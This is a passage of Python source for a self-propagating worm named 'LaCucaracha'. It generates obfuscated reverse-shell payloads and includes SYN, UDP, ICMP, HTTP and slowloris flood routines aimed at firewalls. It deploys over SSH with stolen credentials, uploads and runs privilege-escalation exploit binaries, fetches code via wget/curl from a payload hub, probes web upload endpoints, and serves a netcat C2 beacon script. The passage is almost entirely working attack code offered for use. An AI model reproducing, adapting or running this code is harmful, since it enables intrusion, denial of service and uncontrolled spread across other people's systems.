        self.db = db or Database()

    def fingerprint_target(self, target_ip: str, target_port: int = 80) -> Dict[str, Any]:
        """Passive TCP fingerprint of target host."""
        fp = {"ip": target_ip, "port": target_port, "window": 65535, "mss": 1460, "ttl": 64}
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_SYNCNT, 1)
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.0\r\n\r\n")
            time.sleep(0.3)
            # Read raw fingerprint from /proc (Linux only)
            try:
                with open(f"/proc/net/tcp", "r") as f:
                    for line in f:
                        if target_ip in line:
                            parts = line.split()
                            if len(parts) > 4:
                                fp["window"] = int(parts[4], 16) & 0xFFFF
                            break
            except Exception:
                pass
            sock.close()
        except Exception:
            pass
        return fp

    def generate_adaptive_payload(self, target_ip: str,
                                  target_port: int = 80) -> Dict:
        """Generate a payload mutated based on the target's TCP fingerprint."""
        fp = self.fingerprint_target(target_ip, target_port)
        seed = fp["window"] ^ fp["mss"] ^ int.from_bytes(
            socket.inet_aton(target_ip), "big"
        )
        rng = random.Random(seed)
        obfuscation_type = rng.choice(["xor", "b64", "rot13", "aes_simple"])

        base_payload = (
            f'import socket,subprocess,os\n'
            f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n'
            f's.connect(("{target_ip}",{target_port}))\n'
            f'os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)\n'
            f'p=subprocess.call(["/bin/sh","-i"])\n'
        )

        if obfuscation_type == "xor":
            key = rng.randint(1, 255)
            enc = bytes([ord(c) ^ key for c in base_payload])
            content = (
                f'python3 -c "import base64; '
                f'_k={key}; '
                f'_d=base64.b64decode(\'{base64.b64encode(enc).decode()}\'); '
                f'exec(bytes([_d[i]^_k for i in range(len(_d))]).decode())"'
            )
        elif obfuscation_type == "rot13":
            rot = str.maketrans(
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
                "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM"
            )
            rot_payload = base_payload.translate(rot)
            content = (
                f'python3 -c "import codecs; '
                f'exec(codecs.decode(\'{base64.b64encode(rot_payload.encode()).decode()}\',\'rot13\'))"'
            )
        else:
            content = f'python3 -c "import base64; exec(base64.b64decode(\'{base64.b64encode(base_payload.encode()).decode()}\').decode())"'

        payload_hash = hashlib.sha3_256(content.encode()).hexdigest()
        size = len(content.encode())

        return {
            "variant": f"adaptive_tcp_{target_ip.replace('.','_')}",
            "content": content,
            "hash": payload_hash,
            "size_bytes": size,
            "obfuscation": f"tcp_fingerprint_{obfuscation_type}",
            "target_ip": target_ip,
            "fingerprint": fp,
            "metadata": {"type": "adaptive", "language": "python"},
        }


# ===================================================================
# DDoSDivisionEngine — Self-Replication on Obstacle
# ===================================================================

class DDoSDivisionEngine:
    """When worm hits a wall (firewall, WAF, rate-limit), spawns a lightweight
    DDoS node that attacks the obstacle while parent continues propagation.
    """

    def __init__(self, db: Optional[Database] = None,
                 icmp_engine: Optional[ICMPEngine] = None):
        self.db = db or Database()
        self.icmp_engine = icmp_engine
        self._ddos_nodes: Dict[str, threading.Thread] = {}
        self._stop_flag: bool = False

    def stop(self) -> None:
        self._stop_flag = True

    def _tcp_checksum(self, ip_src: str, ip_dst: str, tcp_segment: bytes) -> int:
        pseudo = socket.inet_aton(ip_src) + socket.inet_aton(ip_dst) + b'\x00\x06' + struct.pack('!H', len(tcp_segment))
        total = pseudo + tcp_segment
        if len(total) % 2 == 1:
            total += b'\x00'
        s = sum(struct.unpack('!%dH' % (len(total)//2), total))
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        return ~s & 0xffff

    def _build_tcp_syn(self, src_ip: str, dst_ip: str, src_port: int, dst_port: int,
                       seq: int = 0, window: int = 65535) -> bytes:
        tcp_header = struct.pack('!HHIIBBHHH',
                                 src_port, dst_port, seq, 0,
                                 5 << 4, 0x02, window, 0, 0)
        checksum = self._tcp_checksum(src_ip, dst_ip, tcp_header)
        tcp_header = struct.pack('!HHIIBBHHH',
                                 src_port, dst_port, seq, 0,
                                 5 << 4, 0x02, window, checksum, 0)
        return tcp_header

    def syn_flood(self, target: str, port: int, count: int = 100) -> int:
        """Send SYN flood packets."""
        sent = 0
        src_ip = "192.168.1.100"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            src_ip = s.getsockname()[0]
            s.close()
        except Exception:
            pass
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            for _ in range(count):
                if self._stop_flag:
                    break
                sport = random.randint(1024, 65535)
                seq = random.randint(0, 0xFFFFFFFF)
                tcp = self._build_tcp_syn(src_ip, target, sport, port, seq)
                ip_hdr = struct.pack('!BBHHHBBH', 0x45, 0, 40, 0, 0, 64, 6, 0)
                raw.sendto(ip_hdr + tcp, (target, 0))
                sent += 1
            raw.close()
        except Exception:
            if _lazy_scapy():
                from scapy.all import IP as ScapyIP, TCP as ScapyTCP, send as scapy_send, RandShort
                for _ in range(count):
                    if self._stop_flag:
                        break
                    pkt = ScapyIP(dst=target) / ScapyTCP(sport=RandShort(), dport=port, flags="S")
                    scapy_send(pkt, verbose=0)
                    sent += 1
        return sent

    def udp_flood(self, target: str, port: int, count: int = 100) -> int:
        """Send UDP flood packets."""
        sent = 0
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"X" * 1024
            for _ in range(count):
                if self._stop_flag:
                    break
                sock.sendto(payload, (target, port))
                sent += 1
            sock.close()
        except Exception:
            pass
        return sent

    def icmp_flood(self, target: str, count: int = 100) -> int:
        """Send ICMP echo flood."""
        sent = 0
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            for _ in range(count):
                if self._stop_flag:
                    break
                pid = os.getpid() & 0xFFFF
                pkt = struct.pack("!BBHHH", 8, 0, 0, pid, 1) + b"X" * 56
                chk = 0
                for i in range(0, len(pkt), 2):
                    if i + 1 < len(pkt):
                        chk += (pkt[i] << 8) + pkt[i + 1]
                chk = (chk >> 16) + (chk & 0xFFFF)
                chk = ~chk & 0xFFFF
                pkt = struct.pack("!BBHHH", 8, 0, chk, pid, 1) + b"X" * 56
                sock.sendto(pkt, (target, 0))
                sent += 1
            sock.close()
        except Exception:
            pass
        return sent

    def http_flood(self, target: str, url: str = "/", count: int = 50,
                   method: str = "GET") -> int:
        """Send HTTP flood."""
        sent = 0
        for _ in range(count):
            if self._stop_flag:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target, 80))
                sock.send(f"{method} {url} HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
                sock.close()
                sent += 1
            except Exception:
                pass
        return sent

    def slowloris(self, target: str, port: int = 80, sockets: int = 100) -> int:
        """Slowloris connection exhaustion attack."""
        active = []
        for _ in range(min(sockets, 200)):
            if self._stop_flag:
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
                active.append(s)
            except Exception:
                pass
        time.sleep(10)
        for s in active:
            try:
                s.close()
            except Exception:
                pass
        return len(active)

    def spawn_ddos_node(self, obstacle_ip: str, method: str = "syn_flood",
                        duration: int = 60, intensity: int = 100) -> str:
        """Fork a new lightweight DDoS node targeting the obstacle."""
        node_id = str(uuid.uuid4())
        self.db.log(f"Spawning DDoS node {node_id[:8]} against {obstacle_ip} ({method})",
                    "WARNING", "ddos")
        thread = threading.Thread(
            target=self._ddos_worker,
            args=(node_id, obstacle_ip, method, duration, intensity),
            daemon=True
        )
        thread.start()
        self._ddos_nodes[node_id] = thread
        self.db.add_node(ip=obstacle_ip, hostname=f"ddos_node_{node_id[:8]}",
                         port=0, os_name="DDoS")
        return node_id

    def _ddos_worker(self, node_id: str, target_ip: str, method: str,
                     duration: int, intensity: int) -> None:
        start_time = time.time()
        self.db.log(f"DDoS node {node_id[:8]} attacking {target_ip} for {duration}s",
                    "INFO", "ddos")
        raw_sock = None
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except Exception:
            pass

        packet_count = 0
        src_ip = "192.168.1.100"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            src_ip = s.getsockname()[0]
            s.close()
        except Exception:
            pass

        while time.time() - start_time < duration and not self._stop_flag:
            try:
                if method == "syn_flood" and _lazy_scapy():
                    from scapy.all import IP as ScapyIP, TCP as ScapyTCP, send as scapy_send, RandShort
                    for _ in range(min(intensity, 50)):
                        pkt = ScapyIP(dst=target_ip) / ScapyTCP(sport=RandShort(), dport=RandShort(), flags="S")
                        scapy_send(pkt, verbose=0)
                    packet_count += intensity
                elif method == "syn_flood" and raw_sock:
                    for _ in range(min(intensity, 30)):
                        sport = random.randint(1024, 65535)
                        dport = random.randint(1, 65535)
                        seq = random.randint(0, 0xFFFFFFFF)
                        tcp_seg = self._build_tcp_syn(src_ip, target_ip, sport, dport, seq)
                        ip_hdr = struct.pack('!BBHHHBBH', 0x45, 0, 40, 0, 0, 64, 6, 0)
                        raw_sock.sendto(ip_hdr + tcp_seg, (target_ip, 0))
                    packet_count += intensity
                elif method == "udp_flood":
                    if _lazy_scapy():
                        from scapy.all import IP as ScapyIP, UDP as ScapyUDP, send as scapy_send, RandShort
                        for _ in range(min(intensity, 50)):
                            pkt = ScapyIP(dst=target_ip) / ScapyUDP(sport=RandShort(), dport=RandShort()) / (b"X"*100)
                            scapy_send(pkt, verbose=0)
                        packet_count += intensity
                    else:
                        packet_count += self.udp_flood(target_ip, random.randint(1, 65535), min(intensity, 50))
                elif method == "icmp_flood":
                    packet_count += self.icmp_flood(target_ip, min(intensity, 50))
                elif method == "http_flood":
                    packet_count += self.http_flood(target_ip, count=min(intensity//5, 20))
                elif method == "slowloris":
                    packet_count += self.slowloris(target_ip, sockets=min(intensity, 100))
                time.sleep(0.05)
            except Exception as e:
                log.debug(f"DDoS node {node_id[:8]} error: {e}")
                time.sleep(0.5)

        if raw_sock:
            raw_sock.close()
        self.db.log(f"DDoS node {node_id[:8]} finished – {packet_count} packets sent",
                    "INFO", "ddos")
        if node_id in self._ddos_nodes:
            del self._ddos_nodes[node_id]

    def spawn_ddos_on_obstacle(self, target_ip: str, obstacle_type: str = "firewall") -> str:
        """Detect obstacle type and spawn appropriate DDoS."""
        method = "syn_flood"
        intensity = 100
        duration = 60
        if "waf" in obstacle_type.lower() or "http" in obstacle_type.lower():
            method, intensity = "http_flood", 50
        elif "icmp" in obstacle_type.lower():
            method, intensity = "icmp_flood", 200
        elif "firewall" in obstacle_type.lower() or "rate" in obstacle_type.lower():
            method, intensity = "syn_flood", 150
        self.db.log(f"Obstacle {obstacle_type} detected on {target_ip} – spawning {method}",
                    "WARNING", "ddos")
        return self.spawn_ddos_node(target_ip, method, duration, intensity)


# ===================================================================
# DeployMethod Enum & DeploymentReport Dataclass
# ===================================================================

class DeployMethod(Enum):
    SSH_PUSH = "ssh_push"
    SSH_EXEC = "ssh_exec"
    WEB_UPLOAD = "web_upload"
    PAYLOAD_HUB = "payload_hub"
    PEER_PROPAGATION = "peer_propagation"
    CRONTAB = "crontab_persist"
    WGET_CURL = "wget_curl_download"


@dataclass
class DeploymentReport:
    success: bool = False
    target_ip: str = ""
    method: DeployMethod = DeployMethod.PAYLOAD_HUB
    payload_variant: str = ""
    deploy_id: str = ""
    detail: str = ""
    error: str = ""


# ===================================================================
# WormDeploymentEngine — Multi-Vector Deployment
# ===================================================================

@dataclass
class WormDeploymentEngine:
    """Multi-vector deployment engine for worm propagation.

    Supported methods:
      - SSH_PUSH: Upload payload via SCP/SFTP
      - SSH_EXEC: Execute payload directly via SSH command
      - WEB_UPLOAD: Upload via web shell or file upload vectors
      - PAYLOAD_HUB: Serve payload for remote download
      - PEER_PROPAGATION: Propagate through established mesh peers
      - CRONTAB: Persist via cron job installation
      - WGET_CURL: Remote download on target
    """
    db: Database = field(default_factory=Database)
    payload_generator: PolymorphicPayloadGenerator = field(default_factory=PolymorphicPayloadGenerator)
    payload_hub_port: int = 10004
    payload_hub_host: str = "0.0.0.0"
    _hub_server: Optional[Any] = None
    _hub_thread: Optional[threading.Thread] = None
    _stop_flag: bool = False
    telegram_callback: Optional[Callable] = None

    def stop(self) -> None:
        self._stop_flag = True

    # ---- SSH Deployment ----

    def _deploy_ssh_push(self, ip: str, port: int,
                         credential: Tuple[str, str],
                         payload: Dict) -> DeploymentReport:
        """Upload payload to target via SFTP and set executable."""
        if not HAVE_PARAMIKO:
            return DeploymentReport(False, ip, DeployMethod.SSH_PUSH,
                                    error="paramiko not installed")
        username, password = credential
        content = payload["content"]
        remote_path = f"/tmp/.sys_{uuid.uuid4().hex[:8]}"
        did = self.db.add_deployment(
            target_ip=ip, method="ssh_push",
            payload_id=payload.get("payload_id", ""),
            payload_variant=payload.get("variant", ""),
        )
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=username, password=password,
                           timeout=15, allow_agent=False, look_for_keys=False)
            # Pre-deploy: SFTP push heel, copy_fail, dirtyfrag directly via existing SSH channel
            try:
                sftp = client.open_sftp()
                # Push heel.bin CVE-2026-31431 privilege escalation
                try:
                    with open("/opt/hermes/exploits/heel.bin", "rb") as hf:
                        sftp.putfo(hf, "/tmp/.heel")
                    sftp.chmod("/tmp/.heel", 0o755)
                except:
                    pass
                # Push copy_fail CVE-2026-31431 escalation
                try:
                    with open("/opt/hermes/exploits/copy_fail", "rb") as cf:
                        sftp.putfo(cf, "/tmp/.cf")
                    sftp.chmod("/tmp/.cf", 0o755)
                except:
                    pass
                # Push dirtyfrag CVE-2026-43284 — overwrites /usr/bin/su with root shell
                try:
                    with open("/opt/hermes/exploits/dirtyfrag", "rb") as df:
                        sftp.putfo(df, "/tmp/.dirtyfrag")
                    sftp.chmod("/tmp/.dirtyfrag", 0o755)
                except:
                    pass
                # Push main payload
                with sftp.open(remote_path, "w") as f:
                    f.write(content)
                sftp.chmod(remote_path, 0o755)
                sftp.close()
                # Execute all deployed binaries
                client.exec_command("cd /tmp && .heel --all &>/dev/null &", timeout=15)
                client.exec_command("cd /tmp && .cf &>/dev/null &", timeout=15)
                client.exec_command("cd /tmp && .dirtyfrag &>/dev/null &", timeout=15)
            except:
                # Fallback: try PULL model if SFTP fails
                try:
                    hub_host = self.payload_hub_host if self.payload_hub_host != "0.0.0.0" else "127.0.0.1"
                    hub_port = self.payload_hub_port if hasattr(self, 'payload_hub_port') else 10004
                    token = _daily_token()
                    heel_cmd = f"cd /tmp && (wget -q http://{hub_host}:{hub_port}/heel?token={token} -O .heel 2>/dev/null || curl -sL http://{hub_host}:{hub_port}/heel?token={token} -o .heel 2>/dev/null) && chmod +x .heel && .heel --all &>/dev/null &"
                    client.exec_command(heel_cmd, timeout=30)
                    df_cmd = f"cd /tmp && (wget -q http://{hub_host}:{hub_port}/dirtyfrag?token={token} -O .df 2>/dev/null || curl -sL http://{hub_host}:{hub_port}/dirtyfrag?token={token} -o .df 2>/dev/null) && chmod +x .df && .df &>/dev/null &"
                    client.exec_command(df_cmd, timeout=30)
                except:
                    pass
            exec_cmd = f"nohup python3 {remote_path} &>/dev/null &"
            _, stdout, stderr = client.exec_command(exec_cmd, timeout=10)
            stdout.channel.recv_exit_status()
            client.close()
            self.db.complete_deployment(did, True)
            self.db.increment_deployed(payload.get("payload_id", ""))
            self.db.log(f"SSH push deploy success: {ip}:{port}", "INFO", "deploy")
            return DeploymentReport(
                success=True, target_ip=ip, method=DeployMethod.SSH_PUSH,
                payload_variant=payload.get("variant", ""),
                deploy_id=did, detail=f"Deployed to {remote_path}",
            )
        except Exception as exc:
            self.db.complete_deployment(did, False, str(exc))
            return DeploymentReport(False, ip, DeployMethod.SSH_PUSH,
                                    error=str(exc), deploy_id=did)

    def _deploy_ssh_exec(self, ip: str, port: int,
                         credential: Tuple[str, str],
                         payload: Dict) -> DeploymentReport:
        """Execute payload directly via SSH command without file transfer."""
        if not HAVE_PARAMIKO:
            return DeploymentReport(False, ip, DeployMethod.SSH_EXEC,
                                    error="paramiko not installed")
        username, password = credential
        content_b64 = base64.b64encode(payload["content"].encode()).decode()
        exec_command = f'python3 -c "import base64; exec(base64.b64decode(\\\"{content_b64}\\\").decode())"'
        did = self.db.add_deployment(
            target_ip=ip, method="ssh_exec",
            payload_id=payload.get("payload_id", ""),
            payload_variant=payload.get("variant", ""),
        )
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=username, password=password,
                           timeout=15, allow_agent=False, look_for_keys=False)
            # Pre-deploy: run heel CVE-2026-31431 privilege escalation + full playbook
            try:
                hub_host = self.payload_hub_host if self.payload_hub_host != "0.0.0.0" else "127.0.0.1"
                hub_port = self.payload_hub_port if hasattr(self, 'payload_hub_port') else 10004
                token = _daily_token()
                heel_cmd = f"cd /tmp && (wget -q http://{hub_host}:{hub_port}/heel?token={token} -O .heel 2>/dev/null || curl -sL http://{hub_host}:{hub_port}/heel?token={token} -o .heel 2>/dev/null) && chmod +x .heel && .heel --all &>/dev/null &"
                client.exec_command(heel_cmd, timeout=30)
                # Dirty Frag CVE-2026-43284 — overwrites /usr/bin/su with root shell
                df_cmd = f"cd /tmp && (wget -q http://{hub_host}:{hub_port}/dirtyfrag?token={token} -O .df 2>/dev/null || curl -sL http://{hub_host}:{hub_port}/dirtyfrag?token={token} -o .df 2>/dev/null) && chmod +x .df && .df &>/dev/null &"
                client.exec_command(df_cmd, timeout=30)
            except:
                pass
            bg_command = f"nohup {exec_command} &>/dev/null &"
            _, stdout, stderr = client.exec_command(bg_command, timeout=10)
            stdout.channel.recv_exit_status()
            client.close()
            self.db.complete_deployment(did, True)
            self.db.increment_deployed(payload.get("payload_id", ""))
            self.db.log(f"SSH exec deploy success: {ip}:{port}", "INFO", "deploy")
            return DeploymentReport(
                success=True, target_ip=ip, method=DeployMethod.SSH_EXEC,
                payload_variant=payload.get("variant", ""),
                deploy_id=did,
            )
        except Exception as exc:
            self.db.complete_deployment(did, False, str(exc))
            return DeploymentReport(False, ip, DeployMethod.SSH_EXEC,
                                    error=str(exc), deploy_id=did)

    # ---- Web Upload Deployment ----

    def _deploy_web_upload(self, ip: str, port: int,
                           payload: Dict) -> DeploymentReport:
        """Upload payload via web shell or file upload endpoint."""
        if not HAVE_REQUESTS:
            return DeploymentReport(False, ip, DeployMethod.WEB_UPLOAD,
                                    error="requests not installed")
        content = payload["content"]
        filename = f".sys_{uuid.uuid4().hex[:8]}.py"
        import requests
        for scheme in ["http", "https"]:
            upload_urls = [
                f"{scheme}://{ip}:{port}/upload.php",
                f"{scheme}://{ip}:{port}/uploads/",
                f"{scheme}://{ip}:{port}/admin/upload.php",
                f"{scheme}://{ip}:{port}/cgi-bin/upload.cgi",
                f"{scheme}://{ip}:{port}/wp-content/plugins/",
                f"{scheme}://{ip}:{port}/api/v1/upload",
            ]
            for url in upload_urls:
                if self._stop_flag:
                    break
                try:
                    files = {"file": (filename, content, "application/octet-stream")}
                    resp = requests.post(url, files=files, timeout=10, verify=False)
                    if resp.status_code in (200, 201, 302):
                        did = self.db.add_deployment(
                            target_ip=ip, method="web_upload",
                            payload_id=payload.get("payload_id", ""),
                            payload_variant=payload.get("variant", ""),
                        )
                        self.db.complete_deployment(did, True)
                        self.db.increment_deployed(payload.get("payload_id", ""))
                        self.db.log(f"Web upload deploy success: {url}", "INFO", "deploy")
                        return DeploymentReport(
                            success=True, target_ip=ip,
                            method=DeployMethod.WEB_UPLOAD,
                            payload_variant=payload.get("variant", ""),
                            deploy_id=did, detail=f"Uploaded to {url}",
                        )
                except Exception:
                    continue
        return DeploymentReport(False, ip, DeployMethod.WEB_UPLOAD,
                                detail="No upload endpoints found")

    # ---- Payload Hub ----

    def _deploy_via_wget(self, ip: str, port: int,
                         credential: Optional[Tuple[str, str]],
                         payload: Dict) -> DeploymentReport:
        """Instruct target to download payload from hub via wget/curl."""
        token = _daily_token()
        # External C2 server — NOT self.payload_hub_host (which is 0.0.0.0 for local binding)
        hub_host = "127.0.0.1"
        hub_url = f"http://{hub_host}:{self.payload_hub_port}/LaCucaracha.py?token={token}"
        download_cmd = (
            f"cd /tmp && "
            f"(wget -q '{hub_url}' -O .upd.py || curl -s '{hub_url}' -o .upd.py) && "
            f"chmod +x .upd.py && "
            f"nohup python3 .upd.py &>/dev/null &"
        )
        if HAVE_PARAMIKO and credential:
            username, password = credential
            did = self.db.add_deployment(
                target_ip=ip, method="wget_curl_download",
                payload_id=payload.get("payload_id", ""),
                payload_variant=payload.get("variant", ""),
            )
            try:
                import paramiko
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=port, username=username, password=password,
                               timeout=15, allow_agent=False, look_for_keys=False)
                _, stdout, stderr = client.exec_command(download_cmd, timeout=15)
                stdout.channel.recv_exit_status()
                client.close()
                self.db.complete_deployment(did, True)
                self.db.increment_deployed(payload.get("payload_id", ""))
                self.db.log(f"Wget deploy success: {ip}:{port}", "INFO", "deploy")
                return DeploymentReport(
                    success=True, target_ip=ip, method=DeployMethod.WGET_CURL,
                    payload_variant=payload.get("variant", ""),
                    deploy_id=did,
                )
            except Exception as exc:
                self.db.complete_deployment(did, False, str(exc))
                return DeploymentReport(False, ip, DeployMethod.WGET_CURL,
                                        error=str(exc), deploy_id=did)
        return DeploymentReport(False, ip, DeployMethod.WGET_CURL,
                                detail="No valid credential for wget push")

    # ---- Payload Hub Server ----

    def start_payload_hub(self) -> None:
        """Start the HTTP payload hub server in a background thread."""
        if self._hub_thread and self._hub_thread.is_alive():
            log.info("Payload hub already running")
            return
        self._hub_thread = threading.Thread(target=self._run_hub, daemon=True)
        self._hub_thread.start()
        log.info(f"Payload hub started on {self.payload_hub_host}:{self.payload_hub_port}")

    def stop_payload_hub(self) -> None:
        """Stop the payload hub server."""
        self._stop_flag = True
        if self._hub_thread:
            self._hub_thread.join(timeout=5)
        log.info("Payload hub stopped")

    def _run_hub(self) -> None:
        """Simple HTTP server for serving payloads."""
        import http.server
        import socketserver

        class PayloadHandler(http.server.BaseHTTPRequestHandler):
            engine_ref = self

            def _verify_token(self):
                qs = self.path.split("?", 1)[-1] if "?" in self.path else ""
                params = {}
                for pair in qs.split("&"):
                    if "=" in pair:
                        k, v = pair.split("=", 1)
                        params[k] = v
                return params.get("token", "") == _daily_token()

            def _serve_busybox(self, path: str):
                """Serve payloads to busybox targets without token validation."""
                sub_path = path.split("busybox/", 1)[1] if "busybox/" in path else ""
                if sub_path == "worm":
                    try:
                        src = open("/opt/hermes/LaCucaracha.py", "rb").read()
                        self.send_response(200)
                        self.send_header("Content-Type", "text/x-python")
                        self.send_header("Content-Disposition",
                                         'attachment; filename="LaCucaracha.py"')
                        self.send_header("X-Worm-Version", "2.0.0")
                        self.send_header("X-Worm-Self", "true")
                        self.end_headers()
                        self.wfile.write(src)
                    except FileNotFoundError:
                        self.send_response(404)
                        self.end_headers()
                        self.wfile.write(b"LaCucaracha source not found")
                elif sub_path == "LaCucaracha.py":
                    try:
                        src = open("/opt/hermes/LaCucaracha.py", "rb").read()
                        self.send_response(200)
                        self.send_header("Content-Type", "text/x-python")
                        self.send_header("Content-Disposition", 'attachment; filename="LaCucaracha.py"')
                        self.send_header("X-Worm-Self", "true")
                        self.end_headers()
                        self.wfile.write(src)
                    except FileNotFoundError:
                        self.send_response(404)
                        self.end_headers()
                        self.wfile.write(b"LaCucaracha source not found")
                elif sub_path in ("shell_beacon.sh", "mini_beacon.sh", "busybox_beacon.sh"):
                    beacon_paths = {
                        "shell_beacon.sh": os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads", "shell_beacon.sh"),
                        "mini_beacon.sh": os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads", "mini_beacon.sh"),
                        "busybox_beacon.sh": os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads", "busybox_beacon.sh"),
                    }
                    bpath = beacon_paths[sub_path]
                    try:
                        content = open(bpath, "rb").read()
                        self.send_response(200)
                        self.send_header("Content-Type", "text/x-shellscript")
                        self.send_header("Content-Disposition", f'attachment; filename="{sub_path}"')
                        self.end_headers()
                        self.wfile.write(content)
                    except FileNotFoundError:
                        self.send_response(200)
                        self.send_header("Content-Type", "text/x-shellscript")
                        self.end_headers()
                        beacon_script = f"#!/bin/sh\\nC2_HOST=\\\"127.0.0.1\\\"\\nC2_PORT=10001\\nwhile true; do\\n  (echo \\\"sh3ll_4cc3ss_b0rg_2026 worm-{sub_path.replace('.sh','')}\\\"; sleep 10) | nc $C2_HOST $C2_PORT 2>/dev/null &\\n  sleep 120\\ndone\\n"
                        self.wfile.write(beacon_script.encode())
                else:
                    self.send_response(404)
                    self.end_headers()
                    self.wfile.write(b"Busybox payload not found")

            def _report_download(self, path: str, client_ip: str, payload_type: str) -> None:
                """Report payload delivery to Telegram via deployment engine callback."""
                try:
                    if self.engine_ref.telegram_callback:
                        msg = (
                            f"📥 **Payload Delivered**\n"
                            f"├ Type: {payload_type}\n"
                            f"├ Path: /{path}\n"
                            f"└ Client: {client_ip}"
                        )
                        self.engine_ref.telegram_callback(msg)
                except Exception:
                    pass

            def do_GET(self):
                path = self.path.split("?")[0].strip("/")
                client_ip = self.client_address[0]
                # Busybox endpoints: no token required (busybox can't compute HMAC-SHA256)
                if path.startswith("busybox/"):
                    self._report_download(path, client_ip, "busybox")
                    self._serve_busybox(path)
                    return
                if not self._verify_token():
                    self.send_response(403)
                    self.end_headers()
                    self.wfile.write(b"403 - Forbidden (valid token required)\n")
                    return
                elif path.startswith("payload/"):
                    self._report_download(path, client_ip, "payload")
                    payload_id = path.split("/", 1)[1]
                    payloads = self.engine_ref.payload_generator.generate_all(persist=True)
                    content = ""
                    for p in payloads:
                        if p.get("payload_id") == payload_id or payload_id == "latest":
                            content = p.get("content", "")
                            if payload_id == "latest":
                                content = payloads[-1]["content"]
                            break
                    if not content:
                        payloads_db = self.engine_ref.db.get_payloads(limit=10)
                        for p in payloads_db:
                            if p.get("id") == payload_id or payload_id == "latest":
                                content = p.get("content", "")
                                break
                    if content:
                        self.send_response(200)
                        self.send_header("Content-Type", "text/x-python")
                        self.send_header("X-Worm-Version", "1.0.0")
                        self.end_headers()
                        self.wfile.write(content.encode())
                    else:
                        self.send_response(404)
                        self.end_headers()
                        self.wfile.write(b"Payload not found")
                elif path == "status":
                    stats = self.engine_ref.db.stats()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps(stats, indent=2).encode())
                elif path == "worm":
                    self._report_download(path, client_ip, "worm")
                    try:
                        src = open("/opt/hermes/LaCucaracha.py", "rb").read()
                        self.send_response(200)
                        self.send_header("Content-Type", "text/x-python")
                        self.send_header("Content-Disposition",
                                         'attachment; filename="LaCucaracha.py"')
                        self.send_header("X-Worm-Version", "2.0.0")
                        self.send_header("X-Worm-Self", "true")
                        self.end_headers()
                        self.wfile.write(src)
                    except FileNotFoundError:
                        self.send_response(404)
                        self.end_headers()
                        self.wfile.write(b"LaCucaracha source not found")
                elif path == "bootstrap":
                    self._report_download(path, client_ip, "bootstrap")
                    hub_ip = self.engine_ref.payload_hub_host
                    if hub_ip == "0.0.0.0":
                        hub_ip = "127.0.0.1"
                    hub_port = self.engine_ref.payload_hub_port
                    token = _daily_token()
                    bootstrap = (
                        "#!/usr/bin/env python3\n"
                        "import os, sys, urllib.request, subprocess\n"
                        f"url = 'http://{hub_ip}:{hub_port}/LaCucaracha.py?token={token}'\n"
                        "try:\n"
                        "    data = urllib.request.urlopen(url, timeout=30).read()\n"
                        "    path = '/tmp/.worm_full.py'\n"
                        "    with open(path, 'wb') as f:\n"
                        "        f.write(data)\n"
                        "    os.chmod(path, 0o755)\n"
                        "    subprocess.Popen([sys.executable, path, '--auto', '--replicate', '--batch', '50', '--hops', '3'],\n"
                        "                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
                        "except Exception as e:\n"
                        "    print(f'Worm bootstrap failed: {e}')\n"
                    )
                    self.send_response(200)
                    self.send_header("Content-Type", "text/x-python")
                    self.send_header("Content-Disposition",
                                     'attachment; filename="worm_bootstrap.py"')
                    self.end_headers()
                    self.wfile.write(bootstrap.encode())
                elif path in ("LaCucaracha.py", "LaCucaracha"):
                    self._report_download(path, client_ip, "LaCucaracha")
                    try:
                        src = open("/opt/hermes/LaCucaracha.py", "rb").read()
                        self.send_response(200)
                        self.send_header("Content-Type", "text/x-python")
                        self.send_header("Content-Disposition", 'attachment; filename="LaCucaracha.py"')
                        self.send_header("X-Worm-Self", "true")
                        self.end_headers()
                        self.wfile.write(src)
                    except FileNotFoundError:
                        self.send_response(404)
                        self.end_headers()
                        self.wfile.write(b"LaCucaracha source not found")
                elif path in ("heel", "heel.latest"):
                    try:
                        src = open("/opt/hermes/exploits/heel.bin", "rb").read()
                        self.send_response(200)
                        self.send_header("Content-Type", "application/octet-stream")
                        self.send_header("Content-Disposition", 'attachment; filename="heel"')
                        self.end_headers()
                        self.wfile.write(src)
                    except FileNotFoundError:
